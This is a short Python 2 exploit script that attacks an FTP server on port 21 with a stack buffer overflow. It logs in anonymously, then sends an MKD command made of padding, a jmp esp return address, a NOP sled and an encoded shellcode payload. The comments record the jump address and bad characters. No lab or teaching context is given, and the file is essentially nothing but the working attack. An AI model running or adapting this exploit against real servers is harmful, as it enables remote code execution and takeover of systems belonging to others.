#!/usr/bin/python2
import socket
import sys

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
port = 21
sock.connect((sys.argv[1],port))
#jmp esp - 7C9D31DB
#badchar - \x00\x0a\x0d
buf =  b""
buf += b"\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x6f\x71\x9a\xb2\x83\xee\xfc\xe2\xf4\x93\x99"
buf += b"\x15\xb2\x6f\x71\xfa\x83\xbd\x15\x11\xe0\x5f\xf8\x7f"
buf += b"\x39\x3d\x7d\x11\xe0\x7b\x7e\x2d\xf8\x49\x40\x65\x39"
buf += b"\x1d\x59\xab\x72\xc3\x4d\xfb\xce\x6d\x5d\xba\x73\xa0"
buf += b"\x7c\x9b\x75\x26\x04\x75\xe0\x38\xfa\xc8\xa2\xe4\x33"
buf += b"\xa6\xb3\xbf\xfa\xda\xca\xea\xb1\xee\xfe\x6e\xa1\xca"
buf += b"\x39\x37\x51\x9b\x61\xe4\x39\x82\x37\xa6\x05\xa6\xfb"
buf += b"\xe4\x45\x11\x83\x90\x70\x4c\x83\xaf\xb0\x55\xbf\xc3"
buf += b"\x70\x5d\x8a\x8f\x04\x6e\xb1\x12\x89\xa1\xcf\x4b\x04"
buf += b"\x7a\xea\xe4\x29\xbe\xb3\xbc\x17\x11\xbe\x24\xfa\xc2"
buf += b"\xae\x6e\xa2\x11\xb6\xe4\x70\x4a\x3b\x2b\x55\xbe\xe9"
buf += b"\x34\x10\xc3\xe8\x3e\x8e\x7a\xea\x30\x2b\x11\xa0\x86"
buf += b"\xf1\x65\x4d\x90\x2c\xf2\x81\x5d\x71\x9a\xda\x18\x02"
buf += b"\xa8\xed\x3b\x19\xd6\xc5\x49\x76\x65\x67\xd7\xe1\x9b"
buf += b"\xb2\x6f\x58\x5e\xe6\x3f\x19\xb3\x32\x04\x71\x65\x67"
buf += b"\x05\x7a\xc3\xe2\x8d\x8c\xf0\xb3\x05\x73\xf2\x58\x60"
buf += b"\xae\x7a\x4d\xba\xe6\xf2\xb0\x6f\x60\xc1\x3b\x89\x1b"
buf += b"\x8a\xe4\x38\x19\x58\x69\x58\x16\x65\x67\xea\xb1\x95"
buf += b"\x37\x37\x71\x9a\xb2\x38\x19\x2d\x5b\x57\x8e\x65\x67"
buf += b"\x38\x19\xee\x5e\x54\x90\x65\x67\x38\xe6\xf2\xc7\x01"
buf += b"\x3c\xfb\x4d\xba\x1b\x9a\xd8\x6b\x27\xcd\xda\x6d\xa8"
buf += b"\x52\xed\x90\xa4\x19\x4a\x6f\x0f\xb7\x39\x59\x1b\xda"
buf += b"\xda\x6f\x61\x9a\xb2\x39\x1b\x9a\xda\x37\xd5\xc9\x57"
buf += b"\x90\xa4\x09\xe1\x05\x71\xcc\xe1\x38\x19\x98\x6b\xa7"
buf += b"\x2e\x65\x67\xec\x89\x9a\xcc\x68\x70\x59\x9b\xa9\x04"
buf += b"\x73\x71\xd4\x81\x2f\x10\x39\x1b\x9a\xe1\x90\xa4\x9a"
buf += b"\xb2"
nop ='\x90'
print(nop*20)
malware = 'A'*248+ '\xDB\x31\x9D\x7C' + nop*20 + buf
print(len(malware))
sock.recv(1024)
sock.send('USER anonymous\r\n')
sock.recv(1024)
sock.send('PASS anonymous\r\n')
sock.send('MKD'+malware+'\r\n')
sock.recv(1024)
sock.send('QUIT\r\n')
sock.close()
